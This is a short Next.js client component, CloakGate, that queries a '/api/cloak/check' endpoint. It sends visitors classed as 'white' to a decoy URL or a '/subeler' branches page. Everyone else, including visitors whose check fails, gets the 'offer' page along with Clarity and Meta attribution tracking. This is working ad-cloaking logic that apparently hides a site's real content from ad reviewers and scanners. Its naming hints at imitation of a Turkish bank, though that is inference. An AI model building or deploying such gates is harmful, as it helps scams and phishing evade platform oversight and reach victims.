"use client";

import { useEffect, useState } from "react";
import { usePathname, useRouter } from "next/navigation";
import { ClarityScript } from "@/components/ClarityScript";
import { MetaAttribution } from "@/components/MetaAttribution";

interface CloakResponse {
  page?: "white" | "offer";
  redirectUrl?: string;
}

export function CloakGate({ children }: { children: React.ReactNode }) {
  const pathname = usePathname();
  const router = useRouter();
  const skip = pathname.startsWith("/crm") || pathname.startsWith("/subeler");
  const [ready, setReady] = useState(skip);
  const [isOffer, setIsOffer] = useState(false);

  useEffect(() => {
    if (skip) return;

    fetch("/api/cloak/check", { cache: "no-store" })
      .then((res) => res.json())
      .then((data: CloakResponse) => {
        if (data.page === "white") {
          if (data.redirectUrl) {
            window.location.replace(data.redirectUrl);
            return;
          }
          router.replace("/subeler");
          return;
        }
        setIsOffer(true);
        setReady(true);
      })
      .catch(() => {
        setIsOffer(true);
        setReady(true);
      });
  }, [skip, router]);

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-ykb-page">
        <div className="h-8 w-8 animate-spin rounded-full border-2 border-white border-t-transparent" />
      </div>
    );
  }

  return (
    <>
      {isOffer && (
        <>
          <ClarityScript />
          <MetaAttribution />
        </>
      )}
      {children}
    </>
  );
}
